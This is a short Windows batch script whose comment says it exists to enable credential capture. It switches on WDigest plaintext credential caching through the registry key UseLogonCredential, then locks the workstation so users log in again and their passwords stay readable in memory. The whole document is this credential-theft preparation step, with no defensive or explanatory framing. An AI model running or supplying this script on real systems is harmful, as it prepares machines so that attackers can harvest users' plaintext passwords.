
:: This script will change the setting responsable for allowing the storage of credentials in memory, aftewards users will have their session locked to enable the capture of credential.

reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
rundll32.exe user32.dll,LockWorkStation
